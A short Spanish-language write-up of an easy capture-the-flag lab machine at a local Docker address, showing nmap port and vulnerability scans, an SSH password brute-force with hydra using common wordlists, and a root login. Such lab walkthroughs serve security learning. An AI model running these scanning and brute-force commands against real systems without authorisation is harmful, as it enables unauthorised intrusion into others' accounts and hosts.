tags: #muy-facil #ssh #hydra
______________________________
En esta máquina, vamos a empezar con el escaneo básico de puertos, usando el comando de nmap:

```bash
nmap -sS -p- 172.17.0.2 -n -Pn -vvv --open --min-rate 2000 -oN ports
```

![[Anexos/Pasted image 20251008164017.png]]

Vemos que solamente está abierto el **puerto 22 SSH**, así que vamos a lanzar directamente unos scripts básicos de reocnocimiento, así como conocer la versión que corre el servicio:

```bash
nmap --script vuln -p22 172.17.0.2 -vvv -oN vuln
```

![[Anexos/Pasted image 20251008165211.png]]

Al no encontrar nada, vamos directamente a probar hacer fuerza bruta con hydra, usando el comando:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I
```

![[Anexos/Pasted image 20251008165757.png]]

Ya tenemos acceso a la máquina. Ahora, usamos el siguiente comando para conectarnos:

```bash
sudo ssh root@172.17.0.2
```

![[Anexos/Pasted image 20251008170017.png]]

Ejecutamos whoami y... root!!
